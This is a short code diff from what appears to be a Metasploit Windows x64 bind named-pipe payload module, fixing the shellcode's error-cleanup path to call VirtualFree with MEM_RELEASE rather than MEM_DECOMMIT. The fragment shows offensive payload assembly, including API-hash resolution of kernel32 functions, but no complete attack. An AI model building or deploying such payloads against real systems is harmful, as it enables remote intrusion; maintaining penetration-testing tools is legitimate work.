@@ -296,12 +296,12 @@ module Payload::Windows::BindNamedPipe_x64
       ; something failed so free up memory
         push r15
         pop rcx                 ; lpAddress
-        push 0x4000             ; MEM_DECOMMIT
+        push 0x8000             ; MEM_RELEASE
         pop r8                  ; dwFreeType
         push 0                  ; 0 to decommit whole block
         pop rdx                 ; dwSize
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
-        call rbp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+        call rbp                ; VirtualFree(payload, 0, MEM_RELEASE)
 
       cleanup_file:
       ; clean up the pipe handle
